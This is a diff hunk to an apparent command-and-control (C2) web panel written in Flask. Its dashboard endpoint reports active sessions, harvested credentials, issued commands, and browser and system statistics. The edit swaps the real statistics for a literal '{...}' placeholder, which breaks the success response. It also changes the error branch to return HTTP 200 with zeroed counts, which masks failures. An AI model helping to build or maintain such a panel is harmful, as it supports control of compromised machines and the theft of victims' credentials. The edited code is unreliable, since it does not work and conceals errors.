@@ -606,25 +606,24 @@ def c2_dashboard():
         
         return jsonify({
             "status": "success",
-            "statistics": {
-                "active_sessions": active_count,
-                "total_sessions": total_sessions,
-                "total_credentials": total_credentials,
-                "total_commands": total_commands,
-                "completed_commands": completed_commands,
-                "system_stats": system_counts,
-                "browser_stats": browser_counts
-            },
-            "recent_activity": recent_activity
+            "statistics": {...}
         }), 200
-    
     except Exception as e:
-        current_app.logger.error(f"Error getting C2 dashboard data: {str(e)}")
-        # Return an error response but still with valid JSON structure
+        current_app.logger.error(f"Error in C2 dashboard: {str(e)}")
         return jsonify({
             "status": "error", 
-            "message": f"Internal server error: {str(e)}"
-        }), 500        
+            "message": "Internal server error",
+            "statistics": {
+                "active_sessions": 0,
+                "total_sessions": 0,
+                "total_credentials": 0,
+                "total_commands": 0,
+                "completed_commands": 0,
+                "system_stats": {},
+                "browser_stats": {},
+                "recent_activity": []
+            }
+        }), 200  
         
         
 def notify_admin_new_session(session_id, session_data):
